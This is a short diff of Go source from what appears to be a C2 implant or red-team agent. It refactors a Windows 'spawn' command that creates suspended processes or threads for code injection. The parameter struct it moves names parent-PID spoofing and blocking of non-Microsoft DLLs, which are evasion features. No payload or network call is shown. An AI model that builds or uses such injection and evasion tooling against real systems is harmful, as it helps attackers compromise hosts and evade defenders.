@@ -11,7 +11,6 @@
 package commands
 
 import (
-	"encoding/json"
 	"fmt"
 	"runtime"
 	"strings"
@@ -110,25 +109,16 @@ func (c *SpawnCommand) Description() string {
 	return "Spawn a suspended process or thread for injection techniques"
 }
 
-// SpawnParams represents the parameters for spawn
-type SpawnParams struct {
-	Mode      string `json:"mode"`      // "process" or "thread"
-	Path      string `json:"path"`      // For process mode: executable path or name
-	PID       int    `json:"pid"`       // For thread mode: target process ID
-	PPID      int    `json:"ppid"`      // Parent PID spoofing (0 = don't spoof)
-	BlockDLLs bool   `json:"blockdlls"` // Block non-Microsoft DLLs in spawned process
-}
-
 // Execute executes the spawn command
 func (c *SpawnCommand) Execute(task structs.Task) structs.CommandResult {
+	ensureInjectionAPIs()
 	if runtime.GOOS != "windows" {
 		return errorResult("Error: This command is only supported on Windows")
 	}
 
-	var params SpawnParams
-	err := json.Unmarshal([]byte(task.Params), &params)
-	if err != nil {
-		return errorf("Error parsing parameters: %v", err)
+	params, parseErr := unmarshalParams[SpawnParams](task)
+	if parseErr != nil {
+		return *parseErr
 	}
 
 	params.Mode = strings.ToLower(params.Mode)
